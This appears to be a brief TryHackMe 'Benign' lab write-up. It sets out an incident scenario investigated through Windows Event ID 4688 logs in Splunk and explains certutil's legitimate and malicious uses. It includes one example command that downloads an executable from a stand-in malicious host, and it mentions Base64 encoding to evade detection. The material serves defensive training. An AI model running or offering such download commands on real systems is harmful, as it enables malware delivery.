Benign (THM)

Scenario

One of the client’s IDS indicated a potentially suspicious process execution indicating one of the hosts from the HR department was compromised. Some tools related to network information gathering / scheduled tasks were executed which confirmed the suspicion. Due to limited resources, we could only pull the process execution logs with Event ID: 4688 and ingested them into Splunk with the index win_eventlogs for further investigation.

Certutil is a built-in Windows command-line tool used for managing certificates, Certificate Authority (CA) services, and related files. Legitimate use: Install, backup, or verify digital certificates — Encode/decode files to/from Base64 —Troubleshoot certificate issues

Malicious use (LOLBAS): Download files from remote servers (certutil -urlcache -split -f http://malicious.com/file.exe file.exe) — Encode/decode malicious payloads to bypass detection — Store and retrieve malware using Base64 encoding to evade security tools
